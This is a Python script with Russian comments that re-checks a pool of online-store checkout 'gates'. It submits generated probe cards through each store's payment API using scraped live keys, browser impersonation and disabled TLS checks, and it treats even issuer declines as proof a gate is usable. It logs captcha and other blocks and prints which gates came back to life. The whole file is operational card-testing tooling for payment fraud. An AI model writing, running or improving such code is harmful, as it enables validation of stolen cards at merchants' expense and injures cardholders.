# language: python, file: scratch/_battle_r10_store.py — раунд 10, проверка боем
# Цель: переверифицировать пул store_gates.json ПОСЛЕ правок D-22/D-23/D-24/D-25
# и показать, сколько записей восстановилось. Старые статусы не затираем —
# пишем рядом в data/store_gates_r10.json и печатаем дифф.
import asyncio
import json
import os
import re
import sys
from collections import Counter

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")

import gate_client as gc
from curl_cffi.requests import AsyncSession

# D-26: отказ эмитента = поверхность жива и довела карту до банка.
# Прежний критерий (только LIVE) выбрасывал живые гейты в «не верифицированные».
LIVE_RE = re.compile(
    r"^(APPROVED|DECLINED|3DS|EXPIRED|INVALID|WRONG_CVC|RESTRICTED|RATE_LIMITED|RETRY|TEST_MODE)")

CAP = 3000  # cents


def reason_of(detail: str) -> str:
    """Свести detail от store_api_confirm к причине из funnel.REASONS."""
    d = (detail or "")
    for code in ("PM_SLUG_MISSING", "ADD_ITEM_NO_JSON", "ADD_ITEM_NO_ITEMS",
                 "NO_PRODUCT_UNDER_CAP", "VARIATION_REQUIRED"):
        if d.startswith(code):
            return code
    if "ADD_ITEM_REJECTED" in d:
        return "ADD_ITEM_REJECTED"
    if "no Nonce" in d:
        return "NO_PM_SLUG"
    if "timeout" in d.lower() or "timed out" in d.lower():
        return "GATE_TIMEOUT"
    if "verify that you are human" in d.lower() or "recaptcha" in d.lower():
        return "CAPTCHA"
    if "cart_empty" in d:
        return "ADD_ITEM_NO_JSON"
    return "UNKNOWN"


async def verify(gate: dict, sem: asyncio.Semaphore) -> dict:
    root = gate["base_url"]
    probe = gc.gen_probe_card()
    card_raw = f"{probe['number']}|{probe['mm']}|{probe['yy']}|{probe['cvc']}"
    async with sem:
        try:
            async with AsyncSession(impersonate="chrome131", verify=False) as s:
                res = await gc.store_api_confirm(s, root, gate.get("pk_live", ""),
                                                 card_raw, country="US",
                                                 max_price_cents=CAP)
        except Exception as e:
            res = {"status": "ERROR", "detail": f"{type(e).__name__}: {e}"[:140]}
    status = res.get("status", "")
    g = dict(gate)
    g["r10_status"] = status
    g["r10_detail"] = str(res.get("detail", ""))[:140]
    g["r10_verified"] = bool(LIVE_RE.match(status))
    g["r10_reason"] = None if g["r10_verified"] else reason_of(g["r10_detail"])
    return g


async def main():
    path = os.path.join("data", "store_gates.json")
    with open(path, encoding="utf-8") as f:
        gates = json.load(f)

    conc = 4
    if "--conc" in sys.argv:
        conc = int(sys.argv[sys.argv.index("--conc") + 1])

    print("=" * 92)
    print(f"[*] БОЙ РАУНДА 10 — переверификация {len(gates)} store-гейтов (cap=${CAP/100:.0f})")
    print(f"[*] Критерий «жив»: вердикт эмитента (D-26), а не только LIVE")
    print(f"[*] Параллельность: {conc}")
    print("=" * 92)

    sem = asyncio.Semaphore(conc)
    results = await asyncio.gather(*[verify(g, sem) for g in gates])

    old_ok = sum(1 for g in gates if g.get("verified"))
    new_ok = sum(1 for g in results if g["r10_verified"])

    print()
    print(f"{'домен':38} {'было':16} {'стало':16}")
    print("-" * 92)
    for o, n in zip(gates, results):
        changed = (o.get("verified") != n["r10_verified"])
        mark = ">>>" if changed else "   "
        print(f"{mark} {n['domain'][:34]:34} {str(o.get('verify_status'))[:15]:16} "
              f"{n['r10_status'][:15]:16}")
        if not n["r10_verified"] and n["r10_reason"]:
            print(f"      └─ {n['r10_reason']}: {n['r10_detail'][:80]}")

    with open(os.path.join("data", "store_gates_r10.json"), "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    print("=" * 92)
    print(f"[🔥] ЖИВЫХ ПОВЕРХНОСТЕЙ:  было {old_ok}  →  стало {new_ok}  "
          f"(Δ {new_ok - old_ok:+d}) из {len(gates)}")
    print()
    print("  восстановлено:", [n["domain"] for o, n in zip(gates, results)
                               if not o.get("verified") and n["r10_verified"]])
    print("  потеряно     :", [n["domain"] for o, n in zip(gates, results)
                               if o.get("verified") and not n["r10_verified"]])
    print()
    print("  причины отказов:", dict(Counter(g["r10_reason"] for g in results
                                            if g["r10_reason"])))
    print("=" * 92)


if __name__ == "__main__":
    asyncio.run(main())
